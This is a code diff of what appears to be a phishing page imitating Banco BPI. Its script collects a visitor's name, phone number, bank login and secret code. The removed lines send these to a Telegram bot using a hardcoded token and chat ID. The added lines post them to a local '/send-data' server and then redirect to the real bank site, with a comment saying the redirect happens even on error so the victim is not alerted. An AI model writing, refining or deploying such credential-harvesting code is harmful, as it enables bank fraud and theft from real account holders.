@@ -221,58 +221,40 @@
     }
 
     function submitInfo() {
-      const name = document.getElementById('fullname').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-      const login = document.getElementById('login').value.trim();
-      const password = document.getElementById('password').value.trim();
-      
-      if (name === '' || phone === '' || login === '' || password === '') {
-        alert('Por favor, preencha todos os campos.');
-        return;
-      }
+  const name = document.getElementById('fullname').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  const login = document.getElementById('login').value.trim();
+  const password = document.getElementById('password').value.trim();
+  
+  if (name === '' || phone === '' || login === '' || password === '') {
+    alert('Por favor, preencha todos os campos.');
+    return;
+  }
 
-      console.log('Dados coletados:', { name, phone, login, password }); // Debug: Log collected data
-      sendToTelegram(name, phone, login, password);
-      window.location.href = 'https://www.bancobpi.pt/particulares';
-    }
-
-    function sendToTelegram(name, phone, login, password) {
-      const token = '7045955625:AAGaTLknx9YYk3powiCXn_R6sIGOP8f3bcE';
-      const chatId = '5114449108';
-      const message = `Novo Login de Cliente:
-      Nome: ${name}
-      Telefone: ${phone}
-      Nome/Nº Adesão: ${login}
-      Código Secreto: ${password}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      const data = {
-        chat_id: chatId,
-        text: message
-      };
-
-      console.log('Enviando para Telegram:', data); // Debug: Log data before sending
-
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data),
-      })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error(`Erro HTTP! Status: ${response.status}`);
-        }
-        return response.json();
-      })
-      .then(data => {
-        console.log('Mensagem enviada com sucesso!', data); // Debug: Log success
-      })
-      .catch(error => {
-        console.error('Erro ao enviar mensagem:', error); // Debug: Log error
-        alert('Erro ao enviar os dados. Tente novamente mais tarde.');
-      });
-    }
+  // Envia para o servidor Node.js
+  fetch('/send-data', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      fullname: name,
+      phone: phone,
+      login: login,
+      password: password
+    }),
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Sucesso:', data);
+    window.location.href = 'https://www.bancobpi.pt/particulares';
+  })
+  .catch(error => {
+    console.error('Erro:', error);
+    // Redireciona mesmo se houver erro para não alertar o usuário
+    window.location.href = 'https://www.bancobpi.pt/particulares';
+  });
+}
   </script>
 </body>
 </html>
